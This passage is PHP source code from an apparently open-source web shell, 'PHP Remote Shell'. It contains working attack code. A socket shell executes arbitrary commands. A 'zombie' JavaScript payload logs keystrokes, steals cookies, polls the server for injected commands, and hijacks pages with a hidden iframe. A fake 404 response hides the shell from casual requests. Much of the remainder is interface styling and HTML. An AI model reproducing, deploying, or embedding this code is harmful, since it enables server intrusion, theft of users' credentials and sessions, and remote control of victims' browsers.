            .FS exploration method : %s<br>
            .IPs : You (<span>%s</span>)/vhost
            (<span>%s</span>)/Public IP (<span>%s</span>)
          </div>
          <div>
            <textarea title=\"PHP error console\" 
             id=error_console style=\"%s\">%s</textarea>
          </div>
        </div>
        <div style='clear:both'></div>",
        ($this->use_cookie) ? 'cookies' : 'script',
        $this->get_execute_method_info_html (),
        $this->get_browse_method_info_html (),
        $_SERVER['REMOTE_ADDR'],
        $_SERVER['SERVER_ADDR'],
        $this->php_function_enabled ('gethostbyname') ?
          gethostbyname ($_SERVER['HTTP_HOST']) : $_SERVER['HTTP_HOST'],
        ($GLOBALS['php_errors']) ? '' : 'display:none',
        $this->htmlentities($GLOBALS['php_errors']));
    }

    function is_ajax_request ()
    {
      return (!empty ($_POST['ajax']));
    }

    function process_ajax_request ()
    {
      switch ($_POST['ajax'])
      {
        case 'z':
          // Edit zombie data
          if (isset ($_POST['id']))
          {
            echo $this->get_zombie_data_html ($_POST['id']);
          }
          // List zombies
          else
          {
            echo $this->get_zombies_list_html ();
          }
          break;
      }

      exit (0);
    }

    function is_zombie_request ()
    {
      return (isset ($_GET['z']) && (
        $_GET['z'] == 'js'   || // send javascript
        $_GET['z'] == 'kl'   || // Get keylogger data
        $_GET['z'] == 'ck'   || // Get cookie data
        $_GET['z'] == 'ping' || // Get web ping result
        $_GET['z'] == 'cmd'     // Send command to execute
      ));
    }

    function process_zombie_request ()
    {
      switch ($_GET['z'])
      {
        case 'js':  // Send javascript
          $this->send_zombie_js_file ();
          break;

        case 'kl':   // get keylogger data
        case 'ck':   // Get cookie data
        case 'ping': // Get ping result
          $this->save_zombie_data ();
          break;

        case 'cmd':  // Send command to execute
          $this->send_cmd_to_zombie ();
          break;
      }
    }

    function is_raw_file_requested ()
    {
      return (!empty ($_GET['r']));
    }

    function send_requested_raw_file ()
    {
      echo $this->read_file (base64_decode ($_GET['r']));
      exit (0);
    }

    function write_cmd_for_zombie ($cmd, $id)
    {
      $file = $this->get_base_tmpdir().'/.z_cmd_'.$id;
      $this->write_file ($file, $cmd, 'a');
    }

    function send_cmd_to_zombie ()
    {
      $ret = '';

      header ('Content-Type: application/javascript');

      if (($id = $this->get_zombie_id_from_referer ()))
      {
        $file = $this->get_base_tmpdir().'/.z_cmd_'.$id;
        if (($data = $this->read_file ($file)))
        {
          $ret = $data;
          unlink ($file);
        }
      }

      echo $ret;

      exit (0);
    }

    function execute_reverse_shell ($ip, $port)
    {
      set_time_limit (0);
      ob_implicit_flush ();

      $home = rtrim ($this->execute_command_safe ('pwd'));

      $prompt = $this->execute_command_safe ('id');
      if (preg_match ('/uid=\d+\(([^\)]+)\)/', $prompt, $m))
      {
        $prompt = $m[1].'@'.$ip;
      }
      else
      {
        $prompt = '<PRS>';
      }

      $help_msg =
        "PRS reverse shell ".APP_VERSION."\n".
        "'quit' to quit, 'shutdown' to kill, 'help' for this help\n";

      $curdir = $home;

      if (
          ($sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false ||
          socket_bind ($sock, $ip, $port) === false ||
          socket_listen ($sock, 5) === false)
      {
        echo socket_strerror(socket_last_error($sock))."\n";
        @socket_close ($sock);
        exit (1);
      }
    
      do
      {
        if (($_sock = socket_accept ($sock)) === false)
        {
          echo socket_strerror(socket_last_error($_sock))."\n";
          break;
        }
    
        socket_write ($_sock, $help_msg, strlen ($help_msg));
    
        do
        {
          $p = "$prompt $curdir$ ";
          socket_write ($_sock, $p, strlen($p));

          if (($buf=trim(socket_read($_sock, 2048, PHP_NORMAL_READ)))===false)
          {
            echo socket_strerror(socket_last_error($_sock))."\n";
            break 2;
          }

          if ($buf == 'help')
          {
            socket_write ($_sock, $help_msg, strlen ($help_msg));
            continue;
          }

          if ($buf == '' || $buf == 'quit')
            break;
    
          if ($buf == 'shutdown')
          {
            socket_close ($_sock);
            break 2;
          }

          if (preg_match ('/^(traceroute|emacs|clear|nano|pico|ping|vim|tail|top|ed|cd)/', $buf, $m))
          {
            $msg = '';

            switch ($m[1])
            {
              case 'clear':
                $msg = "\033c";
                socket_write ($_sock, $msg, strlen($msg));
                continue 2;

              case 'top':
                $msg = "[PRS : added '-n 1 -b']\n".
                       "[PRS : waiting for result...]\n";
                $buf = preg_replace ('/^top/', 'top -n 1 -b', $buf);
                break;

              case 'ping':
                if (!preg_match ('/ \-c\s*1 /', $buf))
                {
                  $msg = "[PRS : added '-c1']\n".
                         "[PRS : waiting for result...]\n";
                    $buf = preg_replace ('/^ping/', 'ping -c1', $buf);
                }
                break;

              case 'traceroute':
                $msg = "[PRS : waiting for result...]\n";
                break;

              case 'tail':
                if (preg_match ('/\s+\-f\s/', $buf))
                {
                  $msg = "[PRS : removed '-f']\n";
                    $buf = preg_replace ('/\s+\-f\s/', ' ', $buf);
                }
                break;

              case 'emacs':
              case 'nano':
              case 'pico':
              case 'vim':
              case 'ed':
                $msg = "[PRS : file editors will not work in this context]\n";
                socket_write ($_sock, $msg, strlen ($msg));
                continue 2;

              case 'cd':
                $old_curdir = $curdir;
    
                if (preg_match ('/^cd\s+(.*)$/', $buf, $m))
                {
                  if ($m[1]{0} != '/')
                  {
                    $curdir = realpath ("$curdir/".$m[1]);
                  }
                  else
                  {
                    $curdir = is_dir ($m[1]) ? $m[1] : false;
                  }

                  // cd directory does not exists, abort
                  if ($curdir === false)
                  {
                    $curdir = $old_curdir;
    
                    $msg = "sh: 1: cd: can't cd to ".$m[1]."\n";
                    socket_write ($_sock, $msg, strlen ($msg));
                  }
                  else
                  {
                    $r = $this->execute_command_safe ("cd $curdir");

                    // cd directory does not exists, abort
                    if ($r)
                    {
                      $curdir = $old_curdir;
    
                      socket_write ($_sock, $r, strlen ($r));          
                    }
                  }
                }
                else 
                {
                  $curdir = $home;
                }
    
                continue 2;
            }

            if ($msg)
            {
              socket_write ($_sock, $msg, strlen ($msg));
            }
          }

          $r = $this->execute_command_safe ("cd $curdir 2>&1;$buf");

          socket_write ($_sock, $r, strlen ($r));

        } while (1);
    
        socket_close ($_sock);
    
      } while (1);
    
      socket_close ($sock);
      exit (0);
    }

    function send_source_code ()
    {
      $this->send_file (basename ($_SERVER['PHP_SELF']), 
                        $this->read_file ($_SERVER['SCRIPT_FILENAME']));
      exit (0);
    }

    function get_zombie_id_from_referer ()
    {
      if (!(isset ($_SERVER['HTTP_REFERER']) &&
           ($referer = $_SERVER['HTTP_REFERER'])))
      {
        return '';
      }

      $infos = parse_url ($referer);
      unset ($infos['query']);
      unset ($infos['fragment']);

      return base64_encode (implode ('|', $infos));
    }

    function save_zombie_data ($local_action = '', $data = '', $id = '')
    {
      $action = $local_action;
      if (!$action)
      {
        $action = $_GET['z'];
        $data = $_GET['d'];
        if (!($id = $this->get_zombie_id_from_referer ()))
        {
          exit (0);
        }
      }

      $data = ($action == 'kl') ?
                "$data\n" : date ('Y-m-d H:i:s')."|~|$data\n";
      
      $file = $this->get_base_tmpdir().'/.z_'.$action.'_'.$id;
      $this->write_file ($file, $data, 'a');

      if (!$local_action)
      {
        exit (0);
      }
    }

    function get_prs_url ()
    {
      $ret = '';

      if (empty ($_SERVER['SCRIPT_URI']))
      {
        $s = ($_SERVER['SERVER_PORT'] == 443 ||
              !empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ?
                'https':'http';

        $p = (!empty ($_SERVER['SERVER_PORT']) &&
              $_SERVER['SERVER_PORT']!= 443 && $_SERVER['SERVER_PORT']!= 80) ?
                ':'.$_SERVER['SERVER_PORT'] : '';

        $ret = "$s://".$_SERVER['HTTP_HOST']."$p".$_SERVER['SCRIPT_NAME'];
      }
      else
      {
        $ret = $_SERVER['SCRIPT_URI'];
      }

      return $ret;
    }

    // Thanks to BeEF :-)
    function send_zombie_js_file ()
    {
      $prs_url = $this->get_prs_url ();

      header('Content-Type: application/javascript');

      // FIXME Do not work with IE
      if (ZOMBIE_USE_HIDDEN_IFRAME)
      {
?>
if ((typeof (prs_z_exists) != 'number' && 
   location.search.substring (location.search.length - 5, 
                              location.search.length) != 'prs=1'))
{
<?php
      }
?>
  var is_ie = (navigator.appName.indexOf ("Microsoft") >= 0);
  var id_interval = 0;
  var prs_nokeyp = 0;
  var prs_z_url = '';
  var prs_z_kl_seq = <?php echo $this->get_zombie_kl_next_seq_number ()?>;
  var prs_z_kl_history = '';

  function prs_z_remove_node (n)
  {
    var e = document.getElementById(n);
    if (e)
      e.parentNode.removeChild (e);
  }

  function prs_z_onload () 
  {
    try 
    {
      var f = (top.frames.length) ? top.frames[0].document : document;

      prs_z_send ('kl', (prs_z_kl_seq++) + '-13-N');
      if (f.cookie)
        // IE url length limitation
        prs_z_send ('ck', f.location.href + '|~|' + 
                    ((is_ie) ? f.cookie.substring (1, 1950) : f.cookie));
    
      f.onkeydown = prs_z_catch_keyd;
      f.onkeypress = prs_z_catch_keyp;
      f.onclick = prs_z_catch_click;
    
      if (!id_interval)
        id_interval = window.setInterval ("prs_z_get_cmd();", 
          <?php echo AJAX_REFRESH_INTERVAL?>);
    }
    // User moved to another domain, so we can not follow it
    catch (e)
    {
      prs_z_send ('kl', (prs_z_kl_seq++) + '-666-N');
    }
  }
  
  function prs_z_catch_keyp (e) 
  {
    if (prs_nokeyp)
      prs_nokeyp = 0;
    else
    {
      var c = (e && e.which) ? e.which : event.keyCode;
      prs_z_catch_key (prs_z_kl_seq + '-' + c + '-N');
    }
  }

  function prs_z_catch_keyd (e) 
  {
    var c = (e && e.which) ? e.which : event.keyCode;

    if (c == 8 || c == 35 || c == 36 || c ==37 || c == 39 || c == 45 || c == 46)
    {
      prs_nokeyp = 1;
      prs_z_catch_key (prs_z_kl_seq + '-' + c + '-S');
    }
    else if ((c >= 8 && c <= 46 || c >= 91 && c <= 93 || 
              c >= 112 && c <= 145) && 
             c != 16 && c != 13 && c != 32)
      prs_nokeyp = 1;
  }

  function prs_z_set_event (el, evname, func) 
  {
    if (el.attachEvent) 
      el.attachEvent ("on" + evname, func);
    else if (el.addEventListener) 
      el.addEventListener (evname, func, true);
    else 
      el["on" + evname] = func;
  }

  function prs_z_ping (url)
  {
    var t_id = 0;
    var iframe = null;
    var id_name = 'prs_z_iframe';

    prs_z_remove_node (id_name);

    prs_z_url = url;
    iframe = document.createElement ('iframe');
    iframe.id = id_name;
    t_id = window.setTimeout ("prs_z_send ('ping', prs_z_url + '--0');",
      <?php echo AJAX_PING_TIMEOUT?>);
    iframe.width = 0; 
    iframe.height = 0;
    iframe.style['display'] = 'none';
    prs_z_set_event (iframe, "load", function () {
      clearTimeout (t_id);
      prs_z_send ('ping', url + '--1')
    });
    iframe.src = url;
    document.getElementsByTagName('body').item(0).appendChild (iframe);
  }

  function prs_z_get_cmd () 
  {
    var script = null;
    var id_name = 'prs_z_script';

    prs_z_remove_node (id_name);

    script = document.createElement ('script');
    script.id = id_name;
    script.type = 'text/javascript';
    script.defer = true;
    script.src = '<?php echo $prs_url?>?z=cmd';
    document.getElementsByTagName('head').item(0).appendChild (script);
  }

  function prs_z_catch_click ()
  {
    if (prs_z_kl_history)
    {
      var d = prs_z_kl_history;

      prs_z_kl_history = '';
      prs_z_send ('kl', d);
    }
  }

  function prs_z_catch_key (d)
  {
    ++prs_z_kl_seq;
    prs_z_kl_history += d;

    if (d != (prs_z_kl_seq - 1) + '-13-N')
      prs_z_kl_history += "\n";
    else
    {
      d = prs_z_kl_history;
      prs_z_kl_history = '';
      prs_z_send ('kl', d);
    }
  }

  function prs_z_send (a, d) 
  {
    var i = new Image ();

    i.src = '<?php echo $prs_url?>?z=' + a + '&d=' + encodeURIComponent (d);
  }
  
<?php
      // FIXME Do not work with IE
      if (ZOMBIE_USE_HIDDEN_IFRAME)
      {
?>
  function prs_z_cuckoo ()
  {
    var head = null;
    var body = null;
    var iframe = null;
    var script = null;
    
    // Remove page body
    head = document.getElementsByTagName('head').item(0);
    head.parentNode.removeChild (head);
    body = document.getElementsByTagName('body').item(0);
    body.parentNode.removeChild (body);
    
    // Create new head
    head = document.createElement ('head');
    
    // Add script to new head
    script = document.createElement ('script');
    script.type = 'text/javascript';
    script.innerHTML = 'var prs_z_exists = 1;';
    head.appendChild (script);
    
    script = document.createElement ('script');
    script.type = 'text/javascript';
    script.src = '<?php echo $prs_url?>?z=js';
    head.appendChild (script);
    
    document.getElementsByTagName('html').item(0).appendChild (head);
    
    // Create new body
    // Add iframe to new body
    iframe = document.createElement ('iframe');
    iframe.id = 'prs_z_main_frame';
    iframe.name = 'prs_z_main_frame';
    iframe.width = '100%';
    iframe.height = '100%';
    iframe.style['border'] = '0';
    prs_z_set_event (iframe, 'load', top.prs_z_onload);
    
    iframe.src = (document.location.href.indexOf ('?') < 0) ?
      document.location.href + '?prs=1' : document.location.href + '&prs=1';
    body = document.createElement ('body');
    body.appendChild (iframe);
    
    document.getElementsByTagName('html').item(0).appendChild (body);
  }

  prs_z_cuckoo ();
}

<?php
      }  
      else
      {
?>
top.document.onkeydown = prs_z_catch_keyd;
top.document.onkeypress = prs_z_catch_keyp;
top.document.onclick = prs_z_catch_click;
window.onload = top.prs_z_onload;
window.setInterval ("prs_z_get_cmd();", <?php echo AJAX_REFRESH_INTERVAL?>);
<?php
      }
      exit (0);
    }
  
    // Do not accept GET method for anything else than images, zombies and
    // direct download.
    // Read the README file for details
    function check_request_method ()
    {
      if ((php_sapi_name () == 'cli') ||
          (ALLOW_SOURCE_CODE_DOWNLOAD && 
           strpos ($_SERVER['REQUEST_URI'], 'prsds=') !== false) || 
          $_SERVER['REQUEST_METHOD'] == 'POST')
      {
        return;
      }

      header ('HTTP/1.1 404 Not Found');
echo<<<HTML
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL {$_SERVER['REQUEST_URI']} was not found on this server.
<hr>
{$_SERVER['SERVER_SIGNATURE']}
</body></html>
HTML;
exit ();
    }

    function self_remove ()
    {
      $this->vars['action_result'] = 
        $this->delete_files ($_SERVER['SCRIPT_FILENAME']);

      if (file_exists ($_SERVER['SCRIPT_FILENAME']))
      {
        echo "<p><b>Hey, I can not remove myself from this server :-(</b></p>";
      }
      else
      {
        echo "<p><b>Hey, you killed me!</b></p>";
      }

      exit (0);
    }
  }

  $prs = new PhpRemoteShell ($config);

  // Self-remove
  if ($prs->vars['display_type'] == SHELL_TYPE_REMOVE)
  {
    $prs->check_auth ();
    $prs->self_remove ();
  }
  // Execute prs as reverse shell, CLI mode
  elseif (php_sapi_name () == 'cli' && $argc >= 3)
  {
    $prs->execute_reverse_shell ($argv[1], $argv[2]);
    exit (0);
  }
  // Send image content and exit
  elseif ($prs->is_raw_file_requested ())
  {
    $prs->send_requested_raw_file ();
  }
  // zombie request
  elseif ($prs->is_zombie_request ())
  {
    $prs->process_zombie_request ();
  }
  // Ajax request
  elseif ($prs->is_ajax_request ())
  {
    $prs->process_ajax_request ();
  }
  // Send PRS source code
  elseif (ALLOW_SOURCE_CODE_DOWNLOAD &&
          !$prs->vars['cryptkey'] &&
          isset ($_GET['prsds']))
  {
    $prs->check_auth ();
    $prs->send_source_code ();
  }
  else
  {
    // Do not accept GET method for anything else than images and zombies
    // returns.
    // read the README file for details
    $prs->check_auth ();
    $prs->check_request_method ();
  }

  if ($prs->vars['command_current'] != '')
  {
    $prs->command_current_execute ();
  }
  elseif ($prs->vars['sql_command_current'] != '')
  {
    $prs->sql_command_current_execute ();
  }
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html>
<head>
<title><?php echo APP_NAME;?> - <?php echo APP_VERSION;?></title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<style>
  body {
    font-family: Verdana, Arial, Helvetica, sans-serif;
    font-size: 10px;
  }
  input,textarea {
    border: 1px black solid; background: #98B2D7; color: black;
    font-family: Verdana, Arial, Helvetica, sans-serif; font-size: 10px;
    padding:3px;
  }
  textarea.ffixe {
    font-family: monospace, courier new; font-size: 12px;
    width:800px;
    height:600px;
    margin-left:auto;
    margin-right:auto;
  }
  input.page_menu {
    border: 1px cornflowerblue solid;
  }
  input.menu_selected {
    background: white;
  }
  input.file_browser_path {
    padding: 5px; border: 1px black solid;margin:2px;
  }
  input.file_browser {
    padding: 5px; border: none; text-align: left;
  }
  input.file_browser_directory {
    padding: 5px; border: none; text-align: left; color: blue;
    font-weight: bold;background: #98B2D7;
  }
  input.file_browser_symlink {
    padding: 5px; border: none; text-align: left; color: #55FFFF;
    font-weight: bold;background: black;
  }
  input.file_browser_file {
    padding: 5px; border: none; text-align: left;
    background:#98B2D7;
  }
  a {
    color: black;
  }
  a:hover {
    color: cornflowerblue;
  }
  div#msg {
    background: white; border: 1px cornflowerblue solid;
    position:fixed;
    top:50%;
    left:50%;
    width:300px;
    height:50px;
    margin-left:-150px;
    margin-top:-25px;
    padding:10px;
  }
  .menu {
    margin-left:auto;
    margin-right:auto;
    background: black;
    color: cornflowerblue;
    padding: 5px;
  }
  .title_file {
    font-weight: bold; font-size: 12px;
  }
  .smenu {
    margin-top:9px;
    border: 1px cornflowerblue solid;
    border-top:none;
    color: cornflowerblue; background: black;
    border-collapse: collapse;
  }
  .smenu a {
    color: cornflowerblue; text-decoration: none;
  }
  .smenu a:hover {
    color: yellow;
  }
  .smenu input:hover {
    color: white;
  }
  div#title {
    background: cornflowerblue; border: 1px black solid; padding: 5px;
    text-align: center; font-weight: bold; font-size: 12px;
  }
  div#title span {
    color: white;
  }
  div#phpcode_output_title {
    text-align: center; font-weight: bold; font-size: 12px;
  }
  table {
    border: 1px black solid;
  }
  th {
    background: cornflowerblue; color: white; vertical-align: top;
    border: 1px black solid;
  }
  th.caption {
    background: black; color: cornflowerblue; vertical-align: top;
    border: 2px cornflowerblue solid; text-align: center;
    padding:3px;
    white-space: nowrap;
  }
  caption {
    background: black; color: cornflowerblue; vertical-align: top;
    border: 2px cornflowerblue solid; text-align: center; padding: 5px;
    font-weight: bold;
    white-space: nowrap;
  }
  th.win_close {
    text-align: right; background: black; color: orange; 
    border: 1px orange solid;
    cursor: pointer;
  }
  table.action_result,
  table.remote_infos {
    margin-left:auto;
    margin-right:auto;
  }
  table.sql_result {
    width: 99%;
    margin-left:auto;
    margin-right:auto;
  }
  table.sql_result tr:hover {
    background: #98B2D7;
  }
  table.file_browser {
    margin-left:auto;
    margin-right:auto;
    width: 90%; border: 1px black solid; border-collapse: collapse;
    text-align: center;
  }
  table.file_browser_legend {
    width: 1%; border: 1px black solid; border-collapse: collapse;
    text-align: left;
  }
  table.file_browser_menu {
    margin-left:auto;
    margin-right:auto;
    background: cornflowerblue;
    padding:5px;
  }
  table.file_browser th {
    background: cornflowerblue; color: white; vertical-align: top;
  }
  .file_browser input,
  input.file_browser_path {
    cursor:pointer; 
  }
  tr.odd {
    background: white;
  }
  tr.even {
    background: #CCDEFF;
  }
  table.file_browser tr:hover {
    background: #98B2D7;
  }
  table.file_browser_legend td {
    padding:3px;
  }
  table.file_browser_legend td.rights_read {
    background: green; border: 1px black solid;
  }
  table.file_browser_legend td.rights_write {
    background: blue; border: 1px black solid;
  }
  table.file_browser_legend td.rights_bad {
    background: red; border: 1px black solid;
  }
  table.file_browser td {
    text-align: left;
    height:24px;
    vertical-align:middle;
  }
  table.file_browser td.rights_read {
    background: green; border: 1px black solid;
  }
  table.file_browser td.rights_write {
    background: blue; border: 1px black solid;
  }
  table.file_browser td.rights_bad {
    background: red; border: 1px black solid;
  }
  tr.header {
    background: cornflowerblue; color: white;
  }
  td {
    vertical-align: top;
  }
  td.value {
    background: white; color: black; font-weight: normal; vertical-align: top;
  }
  td.label {
    background: cornflowerblue; font-weight: bold; vertical-align: top;
  }
  td.num {
    background: black; color: orange; border: 1px cornflowerblue solid;
    font-weight: bold; vertical-align: middle; text-align: center;
    width: 20px;
  }
  pre {
    font-family: monospace, courier; background: #004594; color: white;
    border: 1px cornflowerblue solid; padding: 5px;
  }
  .box {
    background: white; top: <?php echo POPUP_DEFAULT_Y;?>px;
    left: <?php echo POPUP_DEFAULT_X;?>px; position: fixed;
    overflow: auto; visibility: visible; z-index: 1;
  }
  div#profile_title {
    margin-left:auto;
    margin-right:auto;
    width:440px;
    padding: 5px;
  }
  div#profile_title > div {
    padding:5px;
  }
  div#profile_title table {
    border: 0;
  }
  div#profile_title textarea {
    font-size: 0.85em; border: 1px solid black; height:5em; width:50em;
  }
  div#profile_title span {
    color: gray; font-weight: bold;
  }
  .disabled {
    background: #94AED6; color: #CEDFFF;
  }
  .info_value {
    color: gray; font-weight: bold;
  }
  #rs_infos {
    font-size:12px;
  }
  .error {color:red; font-weight:bold; text-align:center;}
  .success {color:blue; font-weight:bold; text-align:center;}
</style>
<!--[if IE]>
<style>
   pre {
    font-family: courier; background: #004594; color: white;
    border: 1px cornflowerblue solid; padding: 5px;
  }
  code {
    font-family: courier;
  }
</style>
<![endif]-->
<script language="javascript">
  // Pretty silly but really simple popups management here :-)
  var zIndex = 1;
  var dragging = false;
  var xOffs = 0;
  var yOffs = 0;
  var mouseX = 0;
  var mouseY = 0;
  var currentPopup = null;
  var currentMenu = null;
  var currentOver = null;
  var is_ie = (navigator.appName.indexOf ("Microsoft") >= 0);
  var currentPageMenu = null;
  var ajax = null;
  var ajax_timer = null;
  var id_interval = 0;

  addEvent (document, 'mousemove', _mouseMove);

  function _submit ()
  {
    var f = document.forms[0];
    var o = null;
    var item = null;
    var arr = new Array (
      'aliases', 'profiles', '<?php echo SQL_POSTGRESQL ?>s',
      '<?php echo SQL_MYSQL ?>s', '<?php echo SQL_LDAP ?>s', 'envpath',
      'bookmarks', 'initpath', 'highlight');
    for (var i = 0; i < arr.length; i++)
    {
      o = arr[i]+'_box';
      item = document.getElementById (o);
      eval ('f.'+o+'_x.value=item.style.left;f.'+o+'_y.value=item.style.top');
    }
    f.submit ();
  }

  function reset_pos (name)
  {
    var item = document.getElementById (name + '_box');
    item.style.left = '<?php echo POPUP_DEFAULT_X ?>px';
    item.style.top = '<?php echo POPUP_DEFAULT_Y ?>px';
  }

  function addEvent (el, evname, func) 
  {
    if (el.attachEvent) 
      el.attachEvent ("on" + evname, func);
    else if (el.addEventListener) 
      el.addEventListener (evname, func, true);
    else 
      el["on" + evname] = func;
  }

  function removeEvent (el, evname, func)
  {
    if (el.detachEvent)
      el.detachEvent ("on" + evname, func);
    else if (el.removeEventListener)
      el.removeEventListener (evname, func, true);
    else
      el["on" + evname] = null;
  }

  function _mouseMove (e)
  {
    if (dragging) return;
    if (document.layers)
    {
      mouseX = e.x;
      mouseY = e.y;
    }
    else if (document.all)
    {
      mouseX = event.clientX;
      mouseY = event.clientY;
    }
    else if (document.getElementById)
    {
      mouseX = e.clientX;
      mouseY = e.clientY;
    }
  }

  function drag_begin (id)
  {
    var posX = 0;
    var posY = 0;
    var item = null;
    currentPopup = id;
    item = document.getElementById (id);
    if (is_ie)
    {
      posX = mouseX + document.body.scrollLeft;
      posY = mouseY + document.body.scrollTop;
    }
    else
    {
      posX = mouseX + window.scrollX;
      posY = mouseY + window.scrollY;
    }
    xOffs = posX - parseInt (item.style.left);
    yOffs = posY - parseInt (item.style.top);
    addEvent (document, 'mousemove', drag_box);
    item.style.cursor = 'move';
    dragging = true;
  }

  function drag_end ()
  {
    var item = null;
    if (!dragging) return;
    dragging = false;
    item = document.getElementById(currentPopup);
    removeEvent (document, 'mousemove', drag_box);
    item.style.cursor = 'default';
    currentPopup = null;
  }

  function drag_box (e)
  {
    var item = document.getElementById (currentPopup);
    if (is_ie)
    {
      item.style.left = 
        (window.event.clientX + document.body.scrollLeft - xOffs) + 'px';
      item.style.top = 
        (window.event.clientY + document.body.scrollTop - yOffs) + 'px';
    }
    else
    {
      item.style.left = (e.pageX - xOffs) + 'px';
      item.style.top = (e.pageY - yOffs) + 'px';
    }
  }

  function menu_show (name)
  {
    var item = null;
    if (!name || !(item = document.getElementById (name)))
      return;
    menu_hide (currentMenu);
    currentMenu = name;
    item.style.visibility = 'visible';
  }

  function menu_hide (name)
  {
    var item = null;
    if (!name || !(item = document.getElementById (name)))
      return;
    item.style.visibility = 'hidden';
  }

  function show_hide (id, i)
  {
    var item = null;
    if (!id || !(item = document.getElementById (id + '_box')))
      return;
    if (item.style.visibility == 'hidden')
    {
      reset_pos (id);
      item.style.zIndex = ++zIndex;
      item.style.visibility = 'visible';
      eval ("document.forms[0].show_hide_" + id + ".value = 'visible'");
      i.checked = true;
    }
    else
    {
      item.style.visibility = 'hidden';
      eval ("document.forms[0].show_hide_" + id + ".value = 'hidden'");
      i.checked = false;
    }
  }

  function menu_hide_async (name)
  {
    setTimeout("{if (currentOver!='"+name +"') document.getElementById('" + 
               name+"').style.visibility='hidden';}", 100)
  }

  function show_hide_page_menu (id)
  {
    var v;
    window.clearInterval (id_interval);
    if (document.layers)
    {
      v = (document.layers[id].display == 'none') ? 'block' : 'none';
      document.layers[id].display = v;
      if (currentPageMenu)
        currentPageMenu.display = 'none';
    }
    else if (document.getElementById)
    {
      v = (document.getElementById(id).style.display == 'none') ? 
        'block' : 'none';
      document.getElementById(id).style.display = v;
      if (currentPageMenu)
        currentPageMenu.style.display = 'none';
    }
    if (v == 'block')
    {
      currentPageMenu = document.getElementById (id);
      if (id == 'id_cc')
        id = 'id_cc_dyn';
      id_interval = window.setInterval ("ajax_refresh(ajax,'" + id + "')", 
        <?php echo AJAX_REFRESH_INTERVAL?>);
    }
    else
      currentPageMenu = null;
  }
</script>
</head>
<body onclick="drag_end()">

<?php
  if ($prs->vars['display_type'] != SHELL_EXECUTE_REVERSE)
  {
?>
<div id=title>
  Welcome to <span><?php echo APP_NAME;?></span> 
  <?php echo APP_VERSION;?>
  <div style='float:right'>
    Current profile&nbsp;: <span><?php
      echo ($prs->vars['profile_current']) ?
            $prs->htmlentities ($prs->vars['profile_current']):'none' ?></span>
  </div>
</div>
<br>
<?php
    echo $prs->get_infosbar_html ();
  }
?>

<p>
<form method=post action="<?php echo $_SERVER['REQUEST_URI'];?>" 
  enctype="multipart/form-data">
<?php
  // Main menu
  if ($prs->vars['display_type'] != SHELL_EXECUTE_REVERSE)
  {
    echo $prs->get_menu_html ();

    if ($tmp = $prs->get_action_result_html ())
    {
      echo $tmp;
    }
  
    // Aliases table
    $prs->display_aliases_html ();
  
    // Profiles table
    $prs->display_profiles_html ();
  
    // Databases tables
    $prs->display_sql_html (SQL_POSTGRESQL);
    $prs->display_sql_html (SQL_MYSQL);
    $prs->display_sql_html (SQL_LDAP);
  
    // Env PATH table
    $prs->display_envpath_html ();
  
    // Bookmarks table
    $prs->display_bookmarks_html ();
  
    // File browser initial path
    $prs->display_file_browser_initpath_html ();
  
    // PHP code highlight
    $prs->display_highlight_html ();
  }

  echo "<div style='margin-top:20px'>";

  switch ($prs->vars['display_type'])
  {
    // MENU Remote informations 
    case SHELL_TYPE_REMOTE_INFOS:

      if (ini_get ('safe_mode'))
      {
        echo "<p>".$prs->get_safe_mode_alert_html('all');
      }
      elseif (!$prs->execute_enabled ())
      {
        echo "<p>".$prs->get_php_function_alert_html();
      }
      else
      {
        echo "<p>";
        $prs->display_remote_infos_html ();
      }

      if ($prs->php_function_enabled ('phpinfo'))
      {
        ob_start ();
        phpinfo ();
        $output = ob_get_contents();
        ob_end_clean ();

        $output = 
          preg_replace (array (
            '#(<html>|<head>|<body>|</head>|</body>|</html>)#i',
            '#<style.*style>#si'
          ),
          array (
            '',
            ''
          ), $output);

        echo "<p><div class=php_infos>$output</div>";
      }

      break;
      
    // MENU SQL
    case SHELL_SQL_TYPE_SHELL:

      echo "<div style='margin:auto;max-width:640px'>";

      if (!$prs->vars['sql_current'])
      {
        echo "<p align=center>You must add a database from the SQL/LDAP menu, and then load (L) it.</p>";
      }
      else
      {
        $msg = '';

        if (!$prs->sql_connection_test ())
        {
          $msg = "<span class=error>Can not connect to database!</span>";
        }
        elseif ($prs->vars['sql_command_current'] != '')
        {
          if ($prs->vars['sql_error'])
          {
            $msg = "<span class=error>".
              nl2br ($prs->htmlentities ($prs->vars['sql_error']))."</span>";
          }
          elseif (!is_array ($prs->vars['sql_command_current_output']))
          {
            $msg = "<span class=success>".$prs->htmlentities (
              $prs->vars['sql_command_current_output'])."</span>";
          }
        }

        if ($msg)
        {
          $msg = "<div style='max-width:200px;margin-bottom:10px'>$msg</div>";
        }

        $prs->display_database_properties_html ();

        echo "<div style=\"float:left;margin-right:2em;\">$msg";

        if ($prs->vars['sql_type'] == SQL_LDAP)
        {
          $rw = $prs->vars['ldap_rw'];

          echo $prs->get_ldap_begin_js();
          echo "
            <input onclick=\"ldap_action_r()\"".
              (($rw == 'r') ? 'CHECKED' : '')." type=radio id=ldap_rw_r 
                    name=ldap_rw value='r'>
                    <label for=ldap_rw_r>Read</label>
            <input onclick=\"ldap_action_w()\" ".
             (($rw == 'w') ? 'CHECKED' : '')." type=radio id=ldap_rw_w
                    name=ldap_rw value='w'>
                    <label for=ldap_rw_w>Write</label><p>
            <p><div id=ldap_section_1>LDIF content&nbsp;:";
        }
        else
        {
          echo "<div id=ldap_section_1>New ".
                $prs->vars['sql_type']." query to execute&nbsp;:";
        }

        echo "
          <p><textarea rows=5 cols=40 name=sql_command>".
          $prs->htmlentities($prs->vars['sql_command_current']).
          "</textarea></div>";

        if ($prs->vars['sql_type'] == SQL_LDAP) 
        {
          $a = $prs->vars['ldap_rw_action'];

          printf ("
            <div id=ldap_section_2>Search filter&nbsp;:
            <p><input type=text size=40 name=ldap_query value=\"%s\">
            <p>Attributes (<i>use coma as attributes separator</i>):
            <p><input type=text size=40 name=sql_info_2 value=\"%s\"></div>
            <div id=ldap_section_3 style='display:none'>
